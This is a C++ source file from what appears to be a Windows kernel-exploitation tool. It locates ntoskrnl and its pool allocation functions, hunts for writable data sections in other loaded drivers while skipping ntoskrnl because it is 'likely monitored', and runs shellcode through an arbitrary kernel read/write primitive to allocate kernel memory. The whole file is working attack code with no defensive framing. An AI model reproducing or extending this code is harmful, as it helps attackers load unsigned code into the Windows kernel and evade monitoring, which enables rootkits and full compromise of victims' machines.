#include "KernelMemory.h"
#include "ShellcodeUtils.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <TlHelp32.h>

uint64_t KernelMemory::FindWritableDataSection(
    uint64_t ntoskrnlBase,
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    const std::string& skipModulePath
) {
    std::cout << "[*] Searching for writable data section..." << std::endl;
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );
    
    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
        ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0;
    
    std::vector<uint8_t> buffer;
    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    buffer.resize(len);
    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
        return 0;

    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
    for (ULONG i = 0; i < modules->Count; i++) {
        uint64_t base = (uint64_t)modules->Modules[i].ImageBase;
        std::string path = std::string(modules->Modules[i].FullPathName);
        
        // Skip specified module (usually ntoskrnl since it's likely monitored)
        if (!skipModulePath.empty() && path.find(skipModulePath) != std::string::npos) 
            continue;

        // Load image from disk
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file) continue;
        
        auto size = file.tellg();
        file.seekg(0);
        std::vector<char> fileBuffer(size);
        if (!file.read(fileBuffer.data(), size)) continue;

        auto dos = (PIMAGE_DOS_HEADER)fileBuffer.data();
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;

        auto nt = (PIMAGE_NT_HEADERS)(fileBuffer.data() + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;

        auto section = IMAGE_FIRST_SECTION(nt);
        for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
            if ((strcmp((char*)section[j].Name, ".data") == 0 || 
                 strcmp((char*)section[j].Name, ".pdata") == 0) && 
                (section[j].Characteristics & IMAGE_SCN_MEM_WRITE)) {
                uint64_t sectionVA = base + section[j].VirtualAddress;
                
                // Try to write a test pattern
                std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
                if (writeMemory(sectionVA, testPattern.data(), testPattern.size())) {
                    std::cout << "[+] Found writable data section in " << path 
                             << " at 0x" << std::hex << sectionVA << std::dec << "\n";
                    return sectionVA;
                }
            }
        }
    }
    
    std::cerr << "[-] Failed to find writable data section" << std::endl;
    return 0;
}

uint64_t KernelMemory::DirectKernelAlloc(
    uint64_t exAllocatePoolAddr,
    size_t size,
    POOL_TYPE poolType,
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    const ShellcodeExecFn& executeShellcode
) {
    std::cout << "[*] Directly allocating " << size << " bytes via ExAllocatePool2" << std::endl;
    
    // Create allocation shellcode
    auto shellcode = ShellcodeUtils::CreateAllocationShellcode(exAllocatePoolAddr, (uint64_t)poolType, size);
    
    // Execute allocation shellcode
    uint64_t allocatedAddr = 0;
    if (!executeShellcode(shellcode.data(), shellcode.size(), &allocatedAddr)) {
        std::cerr << "[-] Failed to execute allocation shellcode" << std::endl;
        return 0;
    }

    if (!allocatedAddr) {
        std::cerr << "[-] Kernel allocation returned NULL" << std::endl;
        return 0;
    }

    std::cout << "[+] Successfully allocated kernel memory at 0x" << std::hex << allocatedAddr << std::dec << std::endl;
    return allocatedAddr;
}

bool KernelMemory::GetKernelInfo(
    uint64_t& ntoskrnlBase,
    uint64_t& exAllocatePoolAddr,
    uint64_t& exFreePoolAddr
) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    
    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );
    
    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
        ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return false;
    
    std::vector<uint8_t> buffer;
    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    buffer.resize(len);
    
    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
        return false;
    
    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
    if (modules->Count == 0) return false;
    
    ntoskrnlBase = (uint64_t)modules->Modules[0].ImageBase;
    std::cout << "[+] Found ntoskrnl.exe at 0x" << std::hex << ntoskrnlBase << std::dec << std::endl;

    // Load ntoskrnl.exe to get function addresses
    HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (!ntoskrnl) return false;

    // Get ExAllocatePool2 address
    uint64_t allocPoolRva = (uint64_t)GetProcAddress(ntoskrnl, "ExAllocatePool2") - (uint64_t)ntoskrnl;
    exAllocatePoolAddr = ntoskrnlBase + allocPoolRva;
    if (!exAllocatePoolAddr) {
        std::cerr << "[-] Failed to find ExAllocatePool2" << std::endl;
        FreeLibrary(ntoskrnl);
        return false;
    }
    std::cout << "[+] Found ExAllocatePool2 at 0x" << std::hex << exAllocatePoolAddr << std::dec << std::endl;

    // Get ExFreePool address
    uint64_t freePoolRva = (uint64_t)GetProcAddress(ntoskrnl, "ExFreePool") - (uint64_t)ntoskrnl;
    exFreePoolAddr = ntoskrnlBase + freePoolRva;
    if (!exFreePoolAddr) {
        std::cerr << "[-] Failed to find ExFreePool" << std::endl;
        FreeLibrary(ntoskrnl);
        return false;
    }
    std::cout << "[+] Found ExFreePool at 0x" << std::hex << exFreePoolAddr << std::dec << std::endl;

    FreeLibrary(ntoskrnl);
    return true;
}
